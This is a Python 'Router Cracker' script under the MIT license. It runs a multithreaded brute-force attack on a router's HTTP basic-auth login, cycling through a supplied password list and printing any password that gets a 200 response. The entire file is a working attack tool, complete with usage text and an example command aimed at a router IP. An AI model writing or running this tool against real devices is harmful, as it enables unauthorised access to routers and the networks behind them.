#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2019 Luiz Fritsch

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import requests
import sys
import argparse
import threading
import time

__author__ = "Luiz Guilherme Fritsch"
__copyright__ = "Copyright (c) 2019 Luiz Fritsch"
__credits__ = ["Luiz Guilherme Fritsch"]
__license__ = "MIT License"
__version__ = "1.0.1"
__maintainer__ = "Luiz Fritsch"
__email__ = "fritsch.guilherm3@gmail.com"
__GITHUB__  =   "https://github.com/luizfritsch"

CRACKED_PASSWORD = None

def usage():
	print ("")
	print ("")
	print ("")
	print ("")
	print ("")
	print ("")
	print ("")
	print ("Usage: ")
	print ("python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist] -a [THREAD amount]")
	print ("")
	print ("Example: ") 
	print ("python cracker.py -t 192.168.0.1 -u admin -p passwordlist.txt -a 4")
	print ("")
	print ("")
	print ("")
	print ("")

def bruteforce(target, passwords, username, threadID):
	
	try:
		
		for password in passwords:
			
			password = str(password.rstrip())
			proxies = {'http': '','https': ''}
			test = requests.get('http://'+target, auth=(username, password))
			code = test.status_code
			
			print  ('THREAD[',threadID,']         USER[',username,']          PASS [',password,']')
			
			if code == 200:
				print ("")
				print ("==========================[LOGIN FOUNDED]==========================")
				print ("")
				print ("===================================================================")
				print ("                 [  :: USER[",username,"] AND PASS[",password,"]  ]")
				print ("===================================================================")
				print ("")
				print ("")
				global CRACKED_PASSWORD
				CRACKED_PASSWORD = password
				print ("")
				print ("")
			
			elif (code == 407) :
				pass
			elif (code == 404) :
				time.sleep(5)
			elif (code == 403) :
				time.sleep(5)
			else:
				print ("Erro.: ",code)
				print ("")
				print ("Password not found")
				sys.exit(0)

	except Exception as e:
		print (e)
		sys.exit(0)



try:
	global target
	global passlist
	global username
	
	target = ''
	passlist = ''
	username = ''

	#Faz o parsing dos argumentos
	parser = argparse.ArgumentParser(description = "Router Cracker", add_help = False)
	parser.add_argument('-h', '--help', action=usage(), help='usage')
	parser.add_argument('-t', '--target',help='routers ip')
	parser.add_argument('-p', '--passlist',help='password list name')
	parser.add_argument('-u','--username',help='username')
	parser.add_argument('-a','--threads',help='threads amount')
	
	args = parser.parse_args()
	
	try:
	
		target = args.target
		username = args.username
		threadAmount = int(args.threads)	
	
	except Exception as e:
		
		print ("Error: ")

		print (e)
		
		print ("You have not passed all the necessary arguments or they are wrong, please run it again...")

		sys.exit(0)
	

	#Le o arquivo de senhas
	fd = open(args.passlist, 'r')
		
	#Salva numa lista
	passwords = fd.readlines()

	#Pega a quantidade de elementos que tem na lista de senhas
	listLength = len(passwords)

	print ("")
	print ("==========================[Starting]==========================")
	print ("")
		
	print ()
	print ("==========================[divide and conquer]==========================")
	print ()

	threads = []

	splited = [passwords[i::threadAmount] for i in range(threadAmount)]

	for i in range(0,threadAmount):

		arrays = splited[i]

		print (len(arrays))

		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username, i])

	for i in range(0,threadAmount):
		
		locals()['thread%d' % i].start()
		
		print ("Thread ",i," foi startada")

		threads.append(locals()['thread%d' % i])


	for t in threads:
	    t.join()
	 
	
	print ("Closing the app...")

except Exception as e:

	print (e)
	sys.exit(0)
